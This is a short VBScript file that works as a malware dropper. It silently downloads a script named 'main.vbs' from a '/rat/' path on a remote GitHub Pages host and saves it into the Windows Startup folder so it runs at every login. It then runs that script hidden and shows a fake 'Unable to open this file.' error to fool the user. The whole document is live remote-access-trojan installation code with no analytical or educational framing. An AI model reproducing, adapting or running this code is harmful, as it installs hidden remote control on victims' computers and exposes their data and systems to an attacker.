On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
startup = shell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
Dim serverAddr, sh
serverAddr = "https://sellitcom.github.io"
baseURL = serverAddr & "/rat/main.vbs"
cacheBuster = "?v=" & Replace(CStr(Timer * 1000), ".", "")
fileURL = baseURL & cacheBuster
fileName = Mid(baseURL, InStrRev(baseURL, "/") + 1)
savePath = startup & "\" & fileName
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", fileURL, False
http.Send
If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile savePath, 2
    stream.Close
    Set sh = CreateObject("WScript.Shell")
    sh.Run "wscript """ & savePath & """", 0, False
    MsgBox "Unable to open this file."
End If